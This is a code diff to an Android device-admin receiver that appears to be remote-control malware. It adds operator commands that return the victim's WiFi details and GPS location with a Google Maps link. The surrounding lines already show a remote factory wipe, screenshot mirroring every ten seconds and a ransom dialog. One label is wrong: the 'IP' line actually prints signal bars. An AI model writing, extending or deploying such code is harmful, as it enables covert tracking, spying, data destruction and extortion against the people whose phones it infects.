@@ -92,6 +92,8 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
                 writer.println("  screen_mirror - Start sending screenshots every 10s");
                 writer.println("  screen_stop   - Stop screen mirror");
+                writer.println("  wifi        - Show WiFi info");
+                writer.println("  location    - Show GPS coordinates + Google Maps link");
                 writer.println("----------------------------------");
 
                 // Read commands from listener
@@ -251,6 +253,12 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             case "screen_stop":
                 context.stopService(new Intent(context, ScreenMirrorService.class));
                 return "🛑 Screen mirror stopped!";
+
+            case "wifi":
+                return getWifiInfo(context);
+
+            case "location":
+                return getLocation(context);
 
             default:
                 return "❌ Unknown command: " + command + " | type 'help' for commands";
@@ -558,12 +566,65 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         }
     }
 
-
     public void showRansomDialog(Context context) {
         Intent intent = new Intent(context, RansomActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
         context.startActivity(intent);
+    }
+
+    // WiFi info
+    private String getWifiInfo(Context context) {
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
+                    context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            android.net.wifi.WifiInfo info = wm.getConnectionInfo();
+            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
+                    context.getSystemService(Context.CONNECTIVITY_SERVICE);
+            android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();
+
+            return "WiFi Info:" +
+                    "\nSSID: " + info.getSSID() +
+                    "\nBSSID: " + info.getBSSID() +
+                    "\nSignal: " + info.getRssi() + " dBm" +
+                    "\nIP: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5 bars" +
+                    "\nConnected: " + (netInfo != null && netInfo.isConnected());
+        } catch (Exception e) {
+            return "WiFi info failed: " + e.getMessage();
+        }
+    }
+
+    // Location info
+    private String getLocation(Context context) {
+        try {
+            android.location.LocationManager lm = (android.location.LocationManager)
+                    context.getSystemService(Context.LOCATION_SERVICE);
+
+            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
+                    context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
+                return "❌ Location permission not granted";
+            }
+
+            android.location.Location location = lm.getLastKnownLocation(
+                    android.location.LocationManager.GPS_PROVIDER);
+
+            if (location == null) {
+                location = lm.getLastKnownLocation(
+                        android.location.LocationManager.NETWORK_PROVIDER);
+            }
+
+            if (location == null) return "❌ Location unavailable";
+
+            return "Location:" +
+                    "\nLatitude: " + location.getLatitude() +
+                    "\nLongitude: " + location.getLongitude() +
+                    "\nAccuracy: " + location.getAccuracy() + "m" +
+                    "\nGoogle Maps: https://maps.google.com/?q=" +
+                    location.getLatitude() + "," + location.getLongitude();
+
+        } catch (Exception e) {
+            return "Location failed: " + e.getMessage();
+        }
     }
 
 
